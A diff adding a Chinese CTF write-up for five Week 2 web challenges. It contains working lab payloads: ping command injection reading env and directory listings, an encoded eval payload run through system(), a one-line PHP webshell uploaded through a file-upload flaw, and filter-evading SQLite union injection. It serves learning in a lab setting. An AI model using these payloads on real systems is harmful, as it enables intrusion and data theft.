@@ -429,3 +429,362 @@ CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) DashSlash/537.36 (KHTML, like Gec
 进入下一关发现终于结束，得到 flag：
 
 flag{4508d441-7a16-a379-c391-0905c60c0a1e}
+
+## Week2 Web
+
+### DD 加速器
+
+这道题目的关键是从提示 “本结果由系统命令 ping 产生” 中猜测到 **RCE**
+
+知道提示就很简单了（甚至不需要了解 ping，和本题目一点关系没有
+
+系统命令 ping 的基本结构：
+
+```plain
+ping x.x.x.x
+```
+
+可以看到服务器操作系统为 **Debian**，直接拼接 **Linux** 系统命令即可：
+
+```plain
+127.0.0.1;ls /
+```
+
+得到：
+
+```plain
+PING 127.0.0.1 (127.0.0.1) 1400(1428) bytes of data.
+1408 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+```
+
+但这道题的 flag 在环境变量里（这里面的是个假 flag
+
+执行 `127.0.0.1;env` 拿到 flag：
+
+flag{d58d03fd-3467-ecb8-5bec-a6af064fbc41}
+
+### 真的是签到诶
+
+进入容器，直接给出了源码：
+
+```php
+<?php
+highlight_file(__FILE__);
+
+$cipher = $_POST['cipher'] ?? '';
+
+function atbash($text) {
+  $result = '';
+  foreach (str_split($text) as $char) {
+    if (ctype_alpha($char)) {
+      $is_upper = ctype_upper($char);
+      $base = $is_upper ? ord('A') : ord('a');
+      $offset = ord(strtolower($char)) - ord('a');
+      $new_char = chr($base + (25 - $offset));
+      $result .= $new_char;
+    } else {
+      $result .= $char;
+    }
+  }
+  return $result;
+}
+
+if ($cipher) {
+  $cipher = base64_decode($cipher);
+  $encoded = atbash($cipher);
+  $encoded = str_replace(' ', '', $encoded);
+  $encoded = str_rot13($encoded);
+  @eval($encoded);
+  exit;
+}
+
+$question = "真的是签到吗？";
+$answer = "真的很签到诶！";
+
+$res =  $question . "<br>" . $answer . "<br>";
+echo $res . $res . $res . $res . $res;
+
+?>
+```
+
+对源码进行分析：
+
+先用 **POST** 方法传入一个名为 `cipher` 的变量，再对其进行 **base64** 编码，随后调用 `atbash` 这个自定义函数，将返回值赋值给 `encoded`，再对其去掉空格，再进行一次 **rot13**，将结果执行 **eval** 函数
+我个人觉得 `$is_upper = ctype_upper($char);` 这个语句比较重要，is_upper 并是一个布尔类型的变量，若右式为真，则被赋值为 true；否则被赋值为 false
+
+这里看了操作系统为 **Debian**，还有 **eval** 函数，因此很明显存在 **RCE**
+
+关键理解点：
+
+str_split — 将字符串转换为数组
+
+foreach (... as $char)：遍历数组并将每个数组字符赋值给 char
+
+ctype_alpha — 做纯字符检测（指的是 a-z 和 A-Z）
+
+ctype_upper — 做大写字母检测
+
+ord — 转换字符串第一个字节为 0-255 之间的值
+- 这里 ord('A') 为65，ord('a') 为97
+
+strtolower — 将字符串转化为小写
+
+str_replace — 子字符串替换
+
+这里贴出脚本：
+
+```python
+import base64
+import codecs
+
+def atbash(text):
+    result = ''
+    for char in text:
+        if char.isalpha():
+            is_upper = char.isupper()
+            base = ord('A') if is_upper else ord('a')
+            offset = ord(char.lower()) - ord('a')
+            new_char = chr(base + (25 - offset))
+            result += new_char
+        else:
+            result += char
+    return result
+
+def inverse_atbash(text):
+    result = ''
+    for char in text:
+        if char.isalpha():
+            is_upper = char.isupper()
+            base = ord('A') if is_upper else ord('a')
+            offset = ord(char.lower()) - ord('a')
+            new_char = chr(base + (25 - offset))
+            result += new_char
+        else:
+            result += char
+    return result
+
+# 我们最终希望 eval 执行的代码（payload）
+payload = 'system("cat\\040/flag");'   # 用 \\040 避免空格被提前处理
+
+print("目标 payload:", payload)
+
+# 1. rot13(payload) 得到 rot13 之前的字符串
+before_rot13 = codecs.encode(payload, 'rot_13')
+print("rot13 前的字符串:", before_rot13)
+
+# 2. atbash 后的字符串（去空格前）应该产生 above（我们构造时不插入多余空格）
+atbash_output = before_rot13.replace(' ', '')   # 确保去空格后正确
+
+# 3. 求 atbash 的输入（即 base64_decode 后的内容）
+cipher_decoded = inverse_atbash(atbash_output)
+print("base64_decode 后应得到的字符串:", cipher_decoded)
+
+# 4. 计算最终的 cipher（base64 编码）
+cipher = base64.b64encode(cipher_decoded.encode()).decode()
+print("\n最终需要 POST 的 cipher 值：")
+print(cipher)
+
+# 正向验证
+print("\n=== 正向验证 ===")
+decoded = base64.b64decode(cipher).decode()
+after_atbash = atbash(decoded)
+after_remove_space = after_atbash.replace(' ', '')
+after_rot13 = codecs.encode(after_remove_space, 'rot_13')
+print("最终 eval 执行的代码:", after_rot13)
+print("验证成功:", after_rot13 == payload)
+```
+
+### 白帽小 K 的故事（1）
+
+进去后根据提示发现为文件上传漏洞
+
+这里直接上传一句话木马：
+
+```php
+<?php @eval($_POST['a']); ?>
+```
+
+上传后访问：
+
+```plain
+http://192.168.153.1:19185/v1/onload
+
+file=123.php&a=system('cat /flag');
+```
+
+得到 flag：
+
+flag{30d21bfa-aa21-b8ce-edbb-e6135464f5ee}
+
+### 搞点哦润吉吃吃🍊
+
+qu学长出的题目（
+
+进入容器，有个登录界面，在源码的最下方找到账号和密码，进入
+
+下一步是要求计算 token 并且 3s 内提交，有表达式：
+
+```plain
+token = (int(time.time()) * multiplier) ^ xor_value
+```
+
+time.time() —— 返回当前时间的时间戳（1970纪元后经过的浮点秒数）
+
+multiplier —— 乘数，一般是个定值
+
+xor_value —— 点击[这里](https://www.ibm.com/docs/en/i/7.5.0?topic=functions-xor)去了解异或
+
+提示说抓包，我们进行抓包，得到数据如下：
+
+```http
+HTTP/1.1 200 OK
+
+Server: Werkzeug/2.3.7 Python/3.12.11
+
+Date: Sun, 12 Apr 2026 06:48:39 GMT
+
+Content-Type: application/json
+
+Vary: Cookie
+
+Set-Cookie: session=.eJxNy8EKhSAQQNF_mbWL9GGW6_5DpAYTJo1phAfRv1e71veeE-Y1EmFJGLZGknfKyOCNHYxTn3hIZAmSNwSvnbOj660ev8e_Pk6bvjPdzyqgmhIuIRfwwg0VtAO5xNfDVLnCdQNO-ilV.adtARw.KI6gUMOaKTgX_xTynI-Pnz1dHKk; HttpOnly; Path=/
+
+Connection: close
+
+Content-Length: 287
+
+  
+
+{
+
+  "expression": "token = (1775976519 * 25827) ^ 0xc04ab3",
+
+  "hint": "doro记得这里会在session里面添加验证参数, 也许Set-Cookie可以帮助我们......",
+
+  "multiplier": 25827,
+
+  "xor_value": "0xc04ab3"
+
+}
+```
+
+这里大致意思是指不光要写脚本去计算随机生成的计算 token 的数据，还得去自动读取每次开始挑战浏览器给的随机的 **session**，带上这个 **session** 发送数据包才有意义
+
+最终脚本如下：
+
+```python
+import requests
+import time
+BASE_URL = "http://192.168.153.1:9223"
+LOGIN_SESSION = "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiRG9ybyJ9.adsLpA.lTV0J_HJbj3H9h-9c58kMhXWZFw"
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Content-Type": "application/json",
+    "Accept": "*/*",
+    "Origin": BASE_URL,
+    "Referer": f"{BASE_URL}/home",
+}
+session = requests.Session()
+session.headers.update(HEADERS)
+session.cookies.update({'session': LOGIN_SESSION})
+print("[*] 开始挑战流程...")
+# Step 1: start_challenge
+start_resp = session.post(f"{BASE_URL}/start_challenge", json={})
+print(f"[*] start_challenge 状态: {start_resp.status_code}")
+# 关键：完整接收并更新所有返回的 Cookie（尤其是新的 session）
+if start_resp.cookies:
+    old_session = session.cookies.get('session')
+    session.cookies.update(start_resp.cookies)
+    new_session = session.cookies.get('session')
+    print(f"[*] Cookie 已更新 | 新 session: {new_session[:60]}...")
+data = start_resp.json()
+print(f"[*] 挑战数据: {data}")
+# Step 2: 计算 token（使用当前时间戳）
+multiplier = int(data['multiplier'])
+xor_val = int(data['xor_value'], 16)
+current_ts = int(time.time()) # 使用现在的时间
+token = (current_ts * multiplier) ^ xor_val
+print(f"[*] 当前时间戳: {current_ts}")
+print(f"[*] multiplier : {multiplier}")
+print(f"[*] xor_value : {hex(xor_val)}")
+print(f"[*] 计算 token : {token}")
+# Step 3: 立即提交（不要有延迟）
+print("[*] 正在提交 verify_token...")
+verify_resp = session.post(f"{BASE_URL}/verify_token", json={"token": token})
+print(f"[*] 提交状态码: {verify_resp.status_code}")
+try:
+    result = verify_resp.json()
+    print(f"🎉 结果: {result}")
+   
+    if result.get('success') == True or 'flag' in str(result).lower():
+        print("\n✅ 成功！拿到 FLAG 了！")
+    else:
+        print("\n❌ 还是失败 → 建议**立刻**再运行一次脚本（时间很敏感）")
+except Exception:
+    print(f"🚨 响应内容: {verify_resp.text}")
+```
+### 小 E 的管理系统
+
+题目提示是 SQL 注入，这里先试图构造单引号
+
+发现单引号，空格均被过滤
+
+随后可以尝试编码绕过，如使用 %09，%20等等可以替代空格的
+
+构造 `1%09union` 得到如下报错：
+
+```plain
+{"error":"database error: Unable to prepare statement: incomplete input"}
+```
+
+询问 AI 得知此题数据库大概率为 **SQLite**
+
+后续再试常规的 union 注入过程中发现 , 被过滤
+
+这里使用 join 去绕过：
+
+```plain
+http://127.0.0.1:37458/query.php?id=1%09union%09select%09*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09name%09FROM%09sqlite_master)%09d%09join%09(select%09sql%09FROM%09sqlite_master)%09f
+```
+
+得到结果：
+
+```http
+[{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"node_status","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_autoindex_sys_config_1","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sqlite_sequence","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":null},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE sqlite_sequence(name,seq)"},{"id":1,"cpu":2,"ram":3,"status":"sys_config","lastChecked":"CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n)"},{"id":1,"cpu":"23%","ram":"45%","status":"Online","lastChecked":"2026-04-13 04:20:30"}]
+```
+
+这里我们查询 sys_config：
+
+```plain
+1%09union%09select%09*%09from%09(select%091)%09a%09join%09(select%092)%09b%09join%09(select%093)%09c%09join%09(SELECT%09config_key%09FROM%09sys_config)%09d%09join%09(SELECT%09config_value%09FROM%09sys_config)%09f
+```
+
+得到 flag：
+
+flag{58af282f-3a2d-545c-f595-83d735e13d76}
+
